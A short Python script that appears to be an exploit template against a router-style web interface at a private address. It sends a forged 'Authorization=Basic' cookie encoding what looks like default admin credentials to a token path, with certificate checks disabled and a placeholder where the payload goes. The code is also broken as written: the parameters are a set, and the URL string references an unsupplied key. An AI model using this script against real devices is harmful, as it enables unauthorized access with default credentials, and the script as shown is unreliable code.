import requests

session = requests.Session()
session.verify = False

ip = "192.168.153.2:80"

def exp(path, cookie):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/80.0.3987.149 Safari/537.36"
        ),
        "Cookie": "Authorization=Basic{cookie}".format(cookie=str(cookie))
    }

    params = {
        "{payload}"
    }

    url = "http://{ip}/{path}/{URI}".format(ip=ip, path=str(path))
    resp = session.get(url, params=params, headers=headers)
    print(resp.text)


exp(
    "AMSHQZKAISQSDUOA",
    "%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"
)
